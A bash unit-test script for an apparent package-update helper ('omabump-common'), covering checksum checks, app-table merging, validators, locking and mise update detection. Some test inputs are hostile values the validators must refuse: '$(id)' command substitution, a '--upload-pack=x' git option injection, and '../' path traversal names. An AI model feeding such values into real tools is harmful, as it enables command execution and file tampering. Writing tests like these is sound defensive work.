#!/bin/bash
# Unit tests for bin/omabump-common. Plain bash: one line per test, every
# test runs, and any failure makes the exit non-zero. Nothing touches the network: fetch,
# mise_run and the git network wrapper are stubbed below, and every XDG
# directory points into a scratch directory.
#
#   tests/run.sh
set -uo pipefail

root=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
# Scratch space inside the checkout, never the system temp directory.
mkdir -p "$root/.tests"
scratch=$(mktemp -d -p "$root/.tests")
trap 'rm -rf "$scratch"; rmdir "$root/.tests" 2>/dev/null' EXIT
export XDG_CONFIG_HOME=$scratch/config XDG_STATE_HOME=$scratch/state XDG_CACHE_HOME=$scratch/cache
mkdir -p "$XDG_CONFIG_HOME/omarchy/omabump" "$scratch/served"

# shellcheck source=../bin/omabump-common
source "$root/bin/omabump-common"
# The real mise_run, kept under another name before the stub replaces it.
eval "$(declare -f mise_run | sed '1s/^mise_run/real_mise_run/')"

# Stubs. fetch serves $scratch/served/<basename of the last argument>.
fetch() {
  local url=${*: -1}
  [[ -f $scratch/served/${url##*/} ]] || return 22
  cat "$scratch/served/${url##*/}"
}
# shellcheck disable=SC2329 # stubs, called from omabump-common
mise_run() { echo "mise_run called in a test" >&2; return 1; }
pgit_net() { echo "pgit_net called in a test" >&2; return 1; }
# Discovery reads the machine's menu and ~/.local/bin; tests set its answer.
discover_out='{"agents":[],"errors":[]}'
discover_run() { printf '%s\n' "$discover_out"; }

n=0 failed=0
pass() { n=$((n + 1)); echo "ok $n - $1"; }
fail() { n=$((n + 1)) failed=$((failed + 1)); echo "FAIL $n - $1${2:+: $2}"; }
# check <name> <command...>: the command must succeed.
check() { local name=$1; shift; if "$@" >/dev/null; then pass "$name"; else fail "$name"; fi; }
# refuse <name> <command...>: the command must fail.
refuse() { local name=$1; shift; if "$@" >/dev/null 2>&1; then fail "$name" "expected a failure"; else pass "$name"; fi; }
# same <name> <expected> <actual>
same() { if [[ $3 == "$2" ]]; then pass "$1"; else fail "$1" "expected '$2', got '$3'"; fi; }

hexsum() { printf '%s' "$2" | "${1}sum" | cut -d' ' -f1; }
b64sum() { printf '%s' "$1" | python3 -c 'import base64, hashlib, sys; print(base64.b64encode(hashlib.sha512(sys.stdin.buffer.read()).digest()).decode())'; }

# --- clean_text ---------------------------------------------------------------

same "clean_text drops control characters and replaces angle brackets" \
  'a‹b›cdé' "$(clean_text $'a<b>\x01\nc\x7fd\té')"
same "clean_text replaces & for notify-send markup" 'a ＆amp; b' "$(clean_text 'a &amp; b')"
x=$(clean_text 'ééé'); same "the locale counts characters, not bytes" 'éé' "${x:0:2}"

same "term_safe: ESC shown, C0 and C1 controls neutralised, UTF-8 kept" \
  $'a^[[31mr\tb é ?2J\nz' "$(printf 'a\x1b[31m\x07r\r\tb é \xc2\x9b2J\nz' | term_safe)"

# --- vendor_checksum: feed ----------------------------------------------------

url=https://cdn.example.com/1.2.3/app-1.2.3-x86_64.pkg.tar.zst
feed_app='{"pkg":"app","checksum":"feed"}'
exact=$(b64sum exact) byname=$(b64sum byname)
cat >"$scratch/feed.yml" <<EOF
version: 1.2.3
files:
  - url: app-1.2.3-x86_64.pkg.tar.zst
    sha512: $byname
    size: 1
  - url: $url
    sha512: $exact
    size: 1
EOF
same "feed checksum: the exact url wins over a basename match" \
  "sha512 $(hexsum sha512 exact)" "$(vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/feed.yml")"
same "feed checksum: a basename match when the url differs" \
  "sha512 $(hexsum sha512 byname)" "$(vendor_checksum "$feed_app" https://mirror.example.com/app-1.2.3-x86_64.pkg.tar.zst 1.2.3 "$scratch/feed.yml")"
refuse "feed checksum: a file the feed does not list" \
  vendor_checksum "$feed_app" https://cdn.example.com/other.pkg.tar.zst 1.2.3 "$scratch/feed.yml"
sed 's/$/\r/' "$scratch/feed.yml" >"$scratch/crlf.yml"
same "feed checksum: a CRLF feed" \
  "sha512 $(hexsum sha512 exact)" "$(vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/crlf.yml")"
printf 'files:\n  - url: %s\n    sha512: not*base64!\n' "$url" >"$scratch/bad.yml"
refuse "feed checksum: malformed base64" vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/bad.yml"
printf 'files:\n  - url: %s\n    sha512: %s\n' "$url" "$(printf 'short' | sha256sum | cut -d' ' -f1 | python3 -c 'import base64, sys; print(base64.b64encode(bytes.fromhex(sys.stdin.read().strip())).decode())')" >"$scratch/short.yml"
refuse "feed checksum: a digest of the wrong length" vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/short.yml"

# --- vendor_checksum: list ----------------------------------------------------

name='app-1.2.3-x86_64.pkg.tar.zst'
printf '%s  other.pkg.tar.zst\n%s  %s\n' "$(hexsum sha256 other)" "$(hexsum sha256 pkg)" "$name" >"$scratch/served/SHA256SUMS"
printf '%s *%s\n' "$(hexsum sha512 pkg)" "$name" >"$scratch/served/SHA512SUMS"
list_app() { jq -cn --arg url "$1" --arg algo "$2" '{pkg: "app", checksum: {url: $url, algo: $algo}}'; }
same "list checksum: sha256" "sha256 $(hexsum sha256 pkg)" \
  "$(vendor_checksum "$(list_app 'https://example.com/{version}/SHA256SUMS' sha256)" "$url" 1.2.3 /dev/null)"
same "list checksum: sha512 with a binary-mode marker" "sha512 $(hexsum sha512 pkg)" \
  "$(vendor_checksum "$(list_app 'https://example.com/{version}/SHA512SUMS' sha512)" "$url" 1.2.3 /dev/null)"
refuse "list checksum: a sha512 list read as sha256" \
  vendor_checksum "$(list_app https://example.com/SHA512SUMS sha256)" "$url" 1.2.3 /dev/null
refuse "list checksum: an algorithm other than sha256 or sha512" \
  vendor_checksum "$(list_app https://example.com/SHA256SUMS md5)" "$url" 1.2.3 /dev/null
refuse "list checksum: a plain http list" \
  vendor_checksum "$(list_app http://example.com/SHA256SUMS sha256)" "$url" 1.2.3 /dev/null
refuse "list checksum: a list that cannot be fetched" \
  vendor_checksum "$(list_app https://example.com/MISSING sha256)" "$url" 1.2.3 /dev/null
refuse "no checksum source" vendor_checksum '{"pkg":"app"}' "$url" 1.2.3 /dev/null

# --- apps_table ---------------------------------------------------------------

real_shipped=$shipped_apps
shipped_apps=$scratch/shipped.json
cat >"$shipped_apps" <<'EOF'
[
  {"pkg": "a", "label": "A", "source": "indicator", "feed": {"type": "command", "command": "echo 6.6.6"}, "_userFeed": true},
  {"pkg": "b", "label": "B", "source": "indicator", "feed": {"type": "aur-rpc"}},
  {"pkg": "c", "label": "C", "source": "indicator"}
]
EOF
cat >"$user_apps" <<'EOF'
[
  {"pkg": "a", "label": "A2"},
  {"pkg": "b", "label": "B2", "feed": {"type": "command", "command": "echo 1.2.3"}},
  {"pkg": "c", "disabled": true},
  {"pkg": "d", "label": "D", "source": "indicator", "feed": {"type": "github-release", "repo": "o/d"}, "_userFeed": false}
]
EOF
table=$(apps_table)
same "apps_table: shipped order, user additions after, disabled hidden" 'a b d' "$(jq -r 'map(.pkg) | join(" ")' <<<"$table")"
same "apps_table: a user entry overrides fields" 'A2 B2' "$(jq -r '[.[0].label, .[1].label] | join(" ")' <<<"$table")"
same "apps_table: _userFeed is never taken from the shipped file" 'null' "$(jq -c '.[0]._userFeed' <<<"$table")"
same "apps_table: a user feed marks the entry" 'true true' "$(jq -r '[.[1]._userFeed, .[2]._userFeed] | join(" ")' <<<"$table")"
same "feed_version: a command feed from the user's file runs" 1.2.3 "$(feed_version "$(app_json b)")"
same "feed_version: a command feed from the shipped file is refused" \
  "command feeds are allowed only from ~/.config/omarchy/omabump/apps.json" "$(feed_version "$(app_json a)" 2>&1 >/dev/null)"
cat >"$user_apps" <<'EOF'
[
  {"pkg": "../../victim", "source": "indicator"},
  {"pkg": "-x", "source": "indicator"},
  {"pkg": "e", "source": "indicator", "installed": ["e", "../f"]},
  {"pkg": "mise:g", "source": "mise", "tool": ["g", "npm:@scope/g"]},
  {"pkg": "mise:h", "source": "mise", "tool": "npm:../h"},
  {"pkg": "mise:i", "source": "indicator"},
  {"pkg": 7}
]
EOF
same "apps_table: entries with bad pkg, installed or tool names are dropped" \
  'a b c mise:g' "$(apps_table 2>/dev/null | jq -r 'map(.pkg) | join(" ")')"
same "apps_table: each dropped entry is named on stderr" 5 "$(apps_table 2>&1 >/dev/null | grep -c '^ignoring app')"
# jq's $ matches before a final newline; bash's =~ and the rules here do not.
printf '[{"pkg": "a\\n", "source": "indicator"}, {"pkg": "mise:j", "source": "mise", "tool": "j\\n"}]\n' >"$user_apps"
same "apps_table: a name ending in a newline is dropped" 'a b c' "$(apps_table 2>/dev/null | jq -r 'map(.pkg) | join(" ")')"
check "pkg_name_ok: claude-desktop" pkg_name_ok claude-desktop
check "pkg_name_ok: lib32-foo+bar@x_y.z" pkg_name_ok lib32-foo+bar@x_y.z
refuse "pkg_name_ok: a leading dot" pkg_name_ok .foo
refuse "pkg_name_ok: a leading dash" pkg_name_ok -foo
refuse "pkg_name_ok: a slash" pkg_name_ok foo/bar
refuse "pkg_name_ok: upper case" pkg_name_ok Foo
check "app_id_ok: mise:claude" app_id_ok mise:claude
refuse "app_id_ok: mise:../x" app_id_ok mise:../x
check "tool_name_ok: npm:@anthropic-ai/claude-code" tool_name_ok npm:@anthropic-ai/claude-code
refuse "tool_name_ok: .." tool_name_ok npm:@a/../b
refuse "tool_name_ok: a leading dash" tool_name_ok -t
check "ref_ok: refs/pull/725/head" ref_ok refs/pull/725/head
refuse "ref_ok: not under refs/" ref_ok heads/master
refuse "ref_ok: .." ref_ok refs/heads/../x
refuse "ref_ok: a space" ref_ok 'refs/heads/a b'
refuse "ref_ok: an option" ref_ok --upload-pack=x
same "recipe_fetch: a recipeFetch outside refs/ is refused" "recipeFetch '--upload-pack=x' is not a refs/ name" \
  "$(recipe_fetch 0123456789abcdef0123456789abcdef01234567 '{"recipeFetch": "--upload-pack=x"}' 2>&1 >/dev/null | grep recipeFetch)"
echo '{"pkg": "x"}' >"$user_apps"
same "apps_table: a user file that is not an array is ignored" 'a b c' "$(apps_table 2>/dev/null | jq -r 'map(.pkg) | join(" ")')"
rm -f "$user_apps"

# --- discovered agents in the app table -----------------------------------------

cat >"$shipped_apps" <<'EOF2'
[
  {"pkg": "mise:grok-cli", "label": "Grok CLI", "source": "mise", "command": "grok", "tool": ["npm:@xai-official/grok"]},
  {"pkg": "mise:oh-my-pi", "label": "Oh My Pi", "source": "mise", "tool": "github:can1357/oh-my-pi"},
  {"pkg": "mise:claude", "label": "Claude Code", "source": "mise", "command": "claude", "tool": ["npm:x/claude", "claude"]},
  {"pkg": "app", "label": "App", "source": "indicator"}
]
EOF2
disc_agent() { jq -cn --arg c "$1" --arg k "$2" --arg l "${3:-$1}" '{command: $c, key: $k, label: $l, source: "wrapper"}'; }
set_discovered() { discover_out=$(printf '%s\n' "$@" | jq -sc '{agents: ., errors: []}'); }
set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent omp github:can1357/oh-my-pi omp)" \
  "$(disc_agent claude claude Claude)" "$(disc_agent muse http:muse 'Muse Code')"
tools_of() { jq -r --arg p "$1" '.[] | select(.pkg == $p) | [.tool] | flatten | join(" ")' <<<"$app_table"; }
load_table
same "merge: attach by command, the discovered key first" 'grok npm:@xai-official/grok' "$(tools_of mise:grok-cli)"
same "merge: attach by a tool alias" 'github:can1357/oh-my-pi' "$(tools_of mise:oh-my-pi)"
same "merge: a key already listed moves first, no duplicate" 'claude npm:x/claude' "$(tools_of mise:claude)"
same "merge: an unknown agent becomes a row with the menu label" 'mise:muse|Muse Code|http:muse|true' \
  "$(jq -r '.[-1] | [.pkg, .label, (.tool | join(" ")), .discovered] | join("|")' <<<"$app_table")"
same "merge: curated labels stay" 'Grok CLI Oh My Pi Claude Code' "$(jq -r '[.[] | select(.source == "mise" and (.discovered | not)) | .label] | join(" ")' <<<"$app_table")"
same "merge: the frozen table is what app_json reads" "$(jq -c '.[] | select(.pkg == "mise:muse")' <<<"$app_table")" "$(app_json http:muse)"
discover_out='{"agents":[],"errors":[]}'
same "merge: app_json keeps the frozen table after discovery changes" 'mise:muse' "$(app_json mise:muse | jq -r .pkg)"
set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent omp github:can1357/oh-my-pi omp)" \
  "$(disc_agent claude claude Claude)" "$(disc_agent muse http:muse 'Muse Code')"
printf '[{"pkg": "mise:grok-cli", "disabled": true}, {"pkg": "mise:muse", "disabled": true}, {"pkg": "mise:claude", "tool": "npm:x/claude"}]' >"$user_apps"
load_table
same "merge: disabled rows stay hidden, by pkg and by mise:<command>" 'mise:oh-my-pi mise:claude app' "$(jq -r 'map(.pkg) | join(" ")' <<<"$app_table")"
same "merge: a tool list the user sets is not extended" 'npm:x/claude' "$(tools_of mise:claude)"
discover_out='{"agents":[{"command":"x","key":"../x","label":"X","source":"wrapper"}],"errors":["bad menu"]}'
load_table 2>/dev/null
same "merge: a discovered key with bad characters drops the row" 'mise:oh-my-pi mise:claude app' "$(jq -r 'map(.pkg) | join(" ")' <<<"$app_table" 2>/dev/null)"
same "discovery errors are kept" 'bad menu' "$discovery_error"
discover_out='not json'
load_table
same "a discovery helper that fails is an error, the table stays" 'bin/omabump-discover failed|3' "$discovery_error|$(jq length <<<"$app_table")"
discover_out='{"agents":[],"errors":[]}'
rm -f "$user_apps"
app_table=""
shipped_apps=$real_shipped

# The shipped table: a disabled identity hides a discovered agent whichever
# name the user disabled it by.
set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent agy antigravity-cli Antigravity)" \
  "$(disc_agent omp github:can1357/oh-my-pi omp)"
pkgs_with() { jq -r --arg c "$1" '[.[] | select(.command == $c or .pkg == "mise:" + $c) | .pkg] | join(" ")' <<<"$app_table"; }
for pair in grok:mise:grok grok:mise:grok-cli agy:mise:agy agy:mise:antigravity-cli omp:mise:omp omp:mise:oh-my-pi; do
  printf '[{"pkg": "%s", "disabled": true}]' "${pair#*:}" >"$user_apps"
  load_table
  same "merge: {\"pkg\": \"${pair#*:}\", \"disabled\": true} hides the ${pair%%:*} agent" '' "$(pkgs_with "${pair%%:*}")"
done
rm -f "$user_apps"
load_table
same "merge: without a disabled entry the agents join their shipped rows" 'mise:grok-cli|mise:antigravity-cli|mise:oh-my-pi' \
  "$(pkgs_with grok)|$(pkgs_with agy)|$(pkgs_with omp)"
printf '[{"pkg": "mise:grok-cli", "source": "indicator", "disabled": true}]' >"$user_apps"
load_table 2>/dev/null
same "merge: a disabled row whose source the user changed still hides its command" '' "$(pkgs_with grok)"
rm -f "$user_apps"

# A source outside the four routes is dropped; "self" is Omabump's own.
printf '[{"pkg": "x1", "source": "self"}, {"pkg": "x2", "source": "shell"}, {"pkg": "x3"}, {"pkg": "x4", "source": "indicator"}]' >"$user_apps"
same "apps_table: a user entry with source self, an unknown or no source is dropped" 'x4' \
  "$(apps_table 2>/dev/null | jq -r '[.[] | select(.pkg | startswith("x")) | .pkg] | join(" ")')"
rm -f "$user_apps"

# A merge that fails with the discovered agents keeps every other row.
real_discover_agents=$(declare -f discover_agents)
discover_agents() { discovered_json='[1]' discovery_error=""; }
load_table 2>/dev/null
same "merge: a failed merge keeps the shipped rows and says so" "$(jq length "$real_shipped")|could not merge discovered agents" \
  "$(jq length <<<"$app_table")|$discovery_error"
eval "$real_discover_agents"
same "merge: the discovered JSON never becomes a jq argument" 0 "$(grep -c 'argjson disc' "$root/bin/omabump-common")"
discover_out='{"agents":[],"errors":[]}'
app_table=""

# --- recipe_version -----------------------------------------------------------

same "recipe_version: plain" 'foo 1.2.3-1' "$(printf 'pkgname=foo\npkgver=1.2.3\npkgrel=1\n' | recipe_version)"
same "recipe_version: quoted, with an epoch" 'foo-bin 2:1.2.3-4' "$(printf "pkgname='foo-bin'\npkgver=\"1.2.3\"\npkgrel=4\nepoch=2\n" | recipe_version)"
same "recipe_version: epoch=0 is no epoch" 'foo 1.0-1' "$(printf 'pkgname=foo\npkgver=1.0\npkgrel=1\nepoch=0\n' | recipe_version)"
refuse "recipe_version: an unreadable pkgver" recipe_version <<<$'pkgname=foo\npkgver=$(echo 1)\npkgrel=1'
refuse "recipe_version: an unreadable epoch" recipe_version <<<$'pkgname=foo\npkgver=1.0\npkgrel=1\nepoch=a'
refuse "recipe_version: no pkgrel" recipe_version <<<$'pkgname=foo\npkgver=1.0'
refuse "recipe_version: a pkgname with a leading dash" recipe_version <<<$'pkgname=-foo\npkgver=1.0\npkgrel=1'

# --- version_ok, upstream_part ------------------------------------------------

check "version_ok: 1.2.3" version_ok 1.2.3
check "version_ok: 1.0+git~r1_x" version_ok 1.0+git~r1_x
refuse "version_ok: an epoch" version_ok 2:1.0
refuse "version_ok: a leading dot" version_ok .1
refuse "version_ok: a leading dash" version_ok -1
refuse "version_ok: a dot segment" version_ok ..
refuse "version_ok: .. inside" version_ok 1..2
check "version_ok: 64 characters" version_ok "$(printf '1%.0s' {1..64})"
refuse "version_ok: 65 characters" version_ok "$(printf '1%.0s' {1..65})"
check "full_version_ok: 2:1.0+git~r1_x-1" full_version_ok 2:1.0+git~r1_x-1
check "full_version_ok: no epoch, pkgrel 1.1" full_version_ok 1.2.3-1.1
refuse "full_version_ok: no pkgrel" full_version_ok 1.2.3
refuse "full_version_ok: a letter epoch" full_version_ok a:1.2.3-1
refuse "full_version_ok: a dot segment" full_version_ok 1:..-1
refuse "full_version_ok: a space" full_version_ok '1.2 3-1'
refuse "version_ok: a space" version_ok '1.2 3'
refuse "version_ok: a slash" version_ok 1.2/3
# The literal text, not its expansion, is what version_ok must refuse.
# shellcheck disable=SC2016
refuse "version_ok: a command substitution" version_ok '$(id)'
refuse "version_ok: empty" version_ok ''
same "upstream_part: epoch and pkgrel cut" 1.2.3 "$(upstream_part 2:1.2.3-4)"
same "upstream_part: pkgrel cut" 1.2.3 "$(upstream_part 1.2.3-1)"

# --- apt_newest ---------------------------------------------------------------

index=$'Package: claude-desktop\nVersion: 1.9.0\n\nPackage: claude-desktop-beta\nVersion: 9.9.9\n\nPackage: claude-desktop\r\nVersion: 1.10.0\r\n\r\nPackage: claude-desktop\nVersion: 1.2.0'
same "apt_newest: vercmp order, exact package name, CRLF stanzas" 1.10.0 "$(apt_newest "$index" claude-desktop)"
refuse "apt_newest: a package the index lacks" apt_newest "$index" claude
index=$'Package: app\nVersion: 9.9.9/../x\n\nPackage: app\nVersion: 1.0\n\nPackage: app\nVersion: $(id)'
same "apt_newest: versions version_ok refuses are skipped" 1.0 "$(apt_newest "$index" app)"
index=$(for i in $(seq 1 600); do printf 'Package: app\nVersion: %s.0\n\n' "$i"; done)
same "apt_newest: only the last 500 matching stanzas count, so the newest release does" 600.0 "$(apt_newest "$index" app)"
index=$'Package: app\nVersion: 1.9\n\nPackage: app\nVersion: 2.0-3ubuntu1\n\nPackage: app\nVersion: 3.0-a/b'
same "apt_newest: a Debian revision is compared and cut, a bad one skipped" 2.0 "$(apt_newest "$index" app)"
index=$'Package: app\nVersion: 2.0-1\n\nPackage: app\nVersion: 1:0.5-1'
same "apt_newest: a Debian epoch wins and is cut" 0.5 "$(apt_newest "$index" app)"
index=$'Package: app\nVersion: 1.9\n\nPackage: app\nVersion: 2.0.0-beta1'
same "apt_newest: an upstream pre-release is not a revision, so not the final release" 1.9 "$(apt_newest "$index" app)"
refuse "deb_version_ok: an epoch that is not a number" deb_version_ok 'x:1.0'
refuse "deb_version_ok: an upstream part version_ok refuses" deb_version_ok '1.0/x-1'

# --- pkgs_pin -----------------------------------------------------------------

repin() { pkgs_base="" pkgs_follow=0 pkgs_pin_ref="" pkgs_pin_error=""; pkgs_pin 2>/dev/null; }
shipped_commit=$(jq -r .omarchyPkgs.commit "$shipped_pins")
repin
same "pkgs_pin: the shipped pin" "$shipped_commit 0" "$pkgs_base $pkgs_follow"
other=0123456789abcdef0123456789abcdef01234567
echo "{\"omarchyPkgs\": {\"commit\": \"$other\"}}" >"$user_pins"
repin
same "pkgs_pin: a user commit overrides the pin" "$other 0" "$pkgs_base $pkgs_follow"
echo '{"omarchyPkgs": {"follow": "master"}}' >"$user_pins"
repin
same "pkgs_pin: following master" "1 refs/heads/master" "$pkgs_follow $pkgs_pin_ref"
echo '{"omarchyPkgs": {"follow": "dev"}}' >"$user_pins"
repin
same "pkgs_pin: an unknown branch to follow is an error" "0 x" "$pkgs_follow ${pkgs_pin_error:+x}$pkgs_base"
echo '{"omarchyPkgs": {"commit": "abc123"}}' >"$user_pins"
repin
same "pkgs_pin: a malformed commit leaves no base" "x" "${pkgs_pin_error:+x}$pkgs_base"
echo '{"omarchyPkgs": {"ref": "refs/heads/../x"}}' >"$user_pins"
repin
same "pkgs_pin: a ref outside refs/ or with .. leaves no base" "x" "${pkgs_pin_error:+x}$pkgs_base"
echo '[]' >"$user_pins"
repin
same "pkgs_pin: a user file that is not an object is ignored" "$shipped_commit" "$pkgs_base"
rm -f "$user_pins"
repin

# --- the clone lock -----------------------------------------------------------

mkdir -p "$cache_dir"
# The holder becomes the sleep itself, so killing it frees the lock.
(exec 9>"$pkgs_lock"; flock 9; exec sleep 30) &
holder=$!
for _ in $(seq 50); do flock -n "$pkgs_lock" true || break; sleep 0.1; done
pkgs_with_lock true; rc=$?
kill "$holder" 2>/dev/null; wait "$holder" 2>/dev/null
same "pkgs_with_lock: busy while another process holds the lock" 75 "$rc"
check "pkgs_with_lock: runs once the lock is free" pkgs_with_lock true

# --- the clone's git config ---------------------------------------------------

# A user's insteadOf for github.com (XDG_CONFIG_HOME is the scratch one here)
# must not move the clone's origin, or pkgs_fetch makes it again every run.
mkdir -p "$XDG_CONFIG_HOME/git"
printf '[url "git@github.com:"]\n\tinsteadOf = https://github.com/\n[http]\n\tproxy = http://proxy.example:3128\n' >"$XDG_CONFIG_HOME/git/config"
git_http_load
real_pkgs_dir=$pkgs_dir
pkgs_dir=$scratch/pkgs-config
git init -q "$pkgs_dir" && pgit remote add origin "$pkgs_url"
same "pgit: the user's insteadOf does not apply to the clone" "$pkgs_url" "$(pgit remote get-url origin)"
same "the scratch git config does rewrite outside it" "git@github.com:omacom/omarchy-pkgs.git" "$(git -C "$pkgs_dir" remote get-url origin)"
same "pgit: the user's http.proxy still applies" "http://proxy.example:3128" "$(pgit config --get http.proxy)"
rm -rf "$XDG_CONFIG_HOME/git" "$pkgs_dir"
git_http_load
pkgs_dir=$real_pkgs_dir

# --- recipe release-age hold --------------------------------------------------

age() { (recipe_file() { [[ -n $1 ]] && printf '%s\n' "$1"; }; recipe_release_age "$1" pkg); }
same "recipe_release_age: hours" 86400 "$(age '{"min_release_age": "24h"}')"
same "recipe_release_age: minutes, leading zero" 5400 "$(age '{"min_release_age": "090m"}')"
same "recipe_release_age: days" 172800 "$(age '{"min_release_age": "2d"}')"
same "recipe_release_age: bare seconds" 3600 "$(age '{"min_release_age": 3600}')"
same "recipe_release_age: none" 0 "$(age '{"upstream": {}}')"
same "recipe_release_age: no package.json" 0 "$(age '')"
same "recipe_release_age: a value sync-upstream refuses" 0 "$(age '{"min_release_age": "24hh"}')"
mkdir -p "$state_dir"
same "seen_since: a new version is seen now" 1000 "$(seen_since app 1.1 1000)"
same "seen_since: the same version keeps its first sighting" 1000 "$(seen_since app 1.1 5000)"
same "seen_since: another row is separate" 5000 "$(seen_since other 1.1 5000)"
same "seen_since: a newer version starts over" 6000 "$(seen_since app 1.2 6000)"
rm -f "$seen_file"

# --- mise: inventory, safe backends, outdated -------------------------------------

real_shipped=$shipped_apps
shipped_apps=$scratch/shipped.json
cat >"$shipped_apps" <<'EOF2'
[
  {"pkg": "mise:a", "source": "mise", "tool": ["a", "npm:a"]},
  {"pkg": "mise:b", "source": "mise", "tool": "b"},
  {"pkg": "mise:c", "source": "mise", "tool": "asdf:c"},
  {"pkg": "mise:d", "source": "mise", "tool": "d"},
  {"pkg": "mise:e", "source": "mise", "tool": "e"}
]
EOF2
mise_calls=$scratch/mise.calls
# The stub answers like mise does here: a and b on aqua (b only inactive
# besides), c through asdf, d not installed, e on http.
mise_run() {
  printf '%s\n' "$*" >>"$mise_calls"
  case $* in
    "ls --json") [[ -z ${mise_fail_ls:-} ]] || { echo "mise ERROR invalid config" >&2; return 1; }
      echo '{"a":[{"version":"1.0","installed":true,"active":true}],"npm:a":[{"version":"0.9","installed":true,"active":true}],
      "b":[{"version":"2.0","installed":true,"active":false}],"asdf:c":[{"version":"3.0","installed":true,"active":true}],
      "d":[{"version":"4.0","installed":false,"active":true}],"e":[{"version":"5.0","installed":true,"active":true}]}' ;;
    "ls --json --backend aqua --backend github --backend gitlab --backend forgejo --backend npm --backend http --backend ubi --backend pipx --backend cargo")
      [[ -z ${mise_fail_backend:-} ]] || return 1; echo '{"a":[],"npm:a":[],"b":[],"e":[]}' ;;
    "outdated --json -- "*) [[ -z ${mise_fail_outdated:-} ]] || { echo "boom" >&2; return 1; }
      [[ -z ${mise_fail_silent:-} ]] || return 124
      # Offline, mise warns per tool and answers {} with exit 0.
      [[ -z ${mise_fail_fetch:-} ]] || { echo "mise WARN  Error getting latest version for e: unable to fetch versions for e: offline" >&2; echo '{}'; return 0; }
      echo '{"e":{"latest":"5.1","requested":"latest"}}' ;;
    "outdated --bump --json -- "*) [[ -z ${mise_fail_bump:-} ]] || { echo "bump boom" >&2; return 1; }
      [[ -z ${mise_fail_silent:-} ]] || return 124
      [[ -z ${mise_fail_fetch:-} ]] || { echo '{}'; return 0; }
      echo '{"a":{"bump":"1.2","latest":"1.2","requested":"1.0"},"e":{"bump":"5.1","latest":"5.1","requested":"latest"}}' ;;
    *) return 1 ;;
  esac
}
# shellcheck disable=SC2329 # mise_load checks for it with command -v
mise() { :; }
reset_mise() { : >"$mise_calls"; mise_ls_json='{}' mise_safe_json='{}' mise_outdated_json='{}' mise_bump_json='{}' mise_error="" mise_bump_error="" mise_backend_error=""; }
load_table; reset_mise
mise_load 1
same "mise: outdated and bump name only the selected keys on safe backends, after --" \
  $'outdated --json -- a e\noutdated --bump --json -- a e' "$(grep '^outdated' "$mise_calls")"
same "mise: one ls for all allowed backends plus the inventory" 2 "$(grep -c '^ls' "$mise_calls")"
row() { mise_row "$1" "$2"; echo "${latest}|${installable}|${mise_update}|${note}|${feed_error}"; }
same "mise_row: a checked key is not unchecked" false "$(mise_row e 5.0; echo "$unchecked")"
same "mise_row: a key on no allowed backend is unchecked" true "$(mise_row asdf:c 3.0; echo "$unchecked")"
same "mise_row: an update mise up reaches" '5.1|true|true||' "$(row e 5.0)"
same "mise_row: pinned below a newer release" '1.2|false|false|Pinned to 1.0, 1.2 exists|' "$(row a 1.0)"
same "mise_row: a key on asdf is not checked and never current" '|false|false|Update check skipped: asdf backend|' "$(row asdf:c 3.0)"
reset_mise
mise_fail_bump=1 mise_load 1
same "mise_row: a bump failure is a check failure, not current" '|true|false||mise outdated --bump failed: bump boom' "$(row a 1.0)"
same "mise_row: a bump failure leaves outdated's answer" '5.1|true|true||' "$(row e 5.0)"
reset_mise
mise_fail_outdated=1 mise_load 1
same "mise_row: an outdated failure" '|true|false||mise outdated failed: boom' "$(row e 5.0)"
reset_mise
# The check and the installer run under set -e; a timeout leaves no stderr.
same "mise_load: a silent outdated failure under set -e is a mise error, not an exit" \
  'mise outdated failed: no error message' "$( (set -euo pipefail; mise_fail_silent=1 mise_load 1; echo "$mise_error") )"
reset_mise
mise_fail_fetch=1 mise_load 1
same "mise_row: versions mise could not fetch (exit 0, {}) are a check failure" \
  '|true|false||mise could not fetch the versions of e: unable to fetch versions for e: offline' "$(row e 5.0)"
same "mise_row: a key mise did fetch is still answered" '1.0|true|false||' "$(row a 1.0)"
# Far more warnings than a pipe holds, the failure first: still recorded.
{ echo "mise WARN  Error getting latest version for e: offline"; for _ in $(seq 3000); do echo "mise WARN  HTTP GET https://example.invalid/x attempt 1 failed (transient): error sending request; retrying"; done; } >"$scratch/mise.err"
mise_fetch_failed=() mise_query=(e)
(set -euo pipefail; mise_note_fetch_failures "$scratch/mise.err"; echo "${mise_fetch_failed[e]:-}") >"$scratch/mise.out"
same "mise_note_fetch_failures: a large stderr under pipefail" offline "$(<"$scratch/mise.out")"
reset_mise
mise_fail_ls=1 mise_load 1
same "mise: a failed inventory is an error, not an empty list" 'mise ls failed: mise ERROR invalid config|{}' "$mise_inventory_error|$mise_ls_json"
reset_mise
mise_load 1
same "mise: a good inventory clears the error" '' "$mise_inventory_error"
reset_mise
mise_fail_backend=1 mise_load 1
same "mise: a failing backend listing is a diagnostic and checks nothing" 'mise ls --backend failed|' "$mise_backend_error|${mise_query[*]}"
same "mise_row: then every row says why" '|false|false|Update check skipped: mise ls --backend failed|' "$(row e 5.0)"
cat >"$shipped_apps" <<'EOF2'
[{"pkg": "mise:c", "source": "mise", "tool": "asdf:c"}, {"pkg": "mise:d", "source": "mise", "tool": "d"}]
EOF2
load_table; reset_mise
mise_load 1
same "mise: no safe selected key, no outdated call" 0 "$(grep -c '^outdated' "$mise_calls")"
# An inventory far over the 128 KiB argument limit still selects.
cat >"$shipped_apps" <<'EOF2'
[{"pkg": "mise:e", "source": "mise", "tool": "e"}]
EOF2
load_table
mise_ls_json=$(jq -nc '[range(3000) | {key: "npm:@pad/tool-\(.)", value: [{version: "1.0.\(.)", installed: true, active: true, install_path: "/home/user/.local/share/mise/installs/pad"}]}]
  | from_entries + {e: [{version: "5.0", installed: true, active: true}]}')
mise_safe_json='{"e": true}' mise_error=""
mise_select
same "mise_select: a $(( ${#mise_ls_json} / 1024 )) KiB inventory works" 'e|' "${mise_query[*]}|$mise_error"
same "mise_active: on the same inventory" 'e 5.0' "$(mise_active '{"tool": ["x", "e"]}')"
app_table='not json'
mise_select
same "mise_select: a failed selection is a mise error" 'could not select the mise tools to check|' "$mise_error|${mise_query[*]}"
unset -f mise
mise_run() { echo "mise_run called in a test" >&2; return 1; }
